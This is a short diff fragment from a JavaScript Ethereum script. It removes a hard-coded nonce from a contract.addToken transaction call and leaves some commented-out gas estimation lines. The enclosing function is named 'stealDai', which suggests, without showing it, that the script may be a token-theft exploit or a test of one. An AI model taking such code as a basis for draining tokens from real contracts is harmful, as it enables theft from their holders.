@@ -55,7 +55,7 @@ const stealDai = async (dai, to, amount) => {
 
     // estimation = await contract.estimateGas.addToken(token, { maxFeePerGas, maxPriorityFeePerGas });
     // console.log(`addToken gas estimation ${estimation}`);
-    let tx = await contract.addToken(token, { nonce: 14, maxFeePerGas, maxPriorityFeePerGas });
+    let tx = await contract.addToken(token, { maxFeePerGas, maxPriorityFeePerGas });
     console.log(`index ${i} tx ${tx.hash}`);
     // await tx.wait();
 
